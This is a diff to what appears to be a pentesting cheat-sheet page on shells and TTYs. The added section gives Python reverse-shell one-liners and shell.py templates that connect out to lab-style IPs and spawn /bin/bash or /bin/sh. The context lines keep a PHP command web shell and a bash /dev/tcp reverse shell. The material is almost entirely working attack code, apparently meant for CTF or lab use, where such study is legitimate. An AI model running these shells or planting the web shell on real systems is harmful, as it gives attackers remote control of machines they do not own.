@@ -1,5 +1,6 @@
 ---
 icon: book-skull
+description: Teletypewriters and Shells
 ---
 
 # Shells/TTYs
@@ -105,6 +106,56 @@ echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
 {% endcode %}
 {% endhint %}
 
+***
+
+{% hint style="danger" %}
+## <mark style="color:purple;">Reverse Shells</mark>
+
+### <mark style="color:purple;">Python Reverse Shells</mark>
+
+#### <mark style="color:purple;">One liners</mark>
+
+{% code title="Uses pty  " overflow="wrap" %}
+```sh
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+```
+{% endcode %}
+
+{% code title="Uses subprocess" overflow="wrap" %}
+```sh
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+{% endcode %}
+
+#### <mark style="color:purple;">Create the shell file</mark>
+
+{% code title="Uses pty " overflow="wrap" %}
+```sh
+echo 'import pty
+import socket
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.10.16.6", 4444))
+[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
+pty.spawn("/bin/bash")
+s.close()' > shell.py
+```
+{% endcode %}
+
+{% code title="Uses subprocess " overflow="wrap" %}
+```bash
+echo 'import socket, subprocess, os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.10.14.157", 1235))
+[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
+subprocess.call(["/bin/sh", "-i"])
+s.close()' > shell.py
+```
+{% endcode %}
+{% endhint %}
+
 
 
 
@@ -180,11 +231,3 @@ Standard [shell.sh](http://shell.sh)
 bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
 ```
 
-Python
-
-```bash
-#IPv4
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-#Inside a file
-echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"10.10.14.18\\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);" > exploit.py
-```
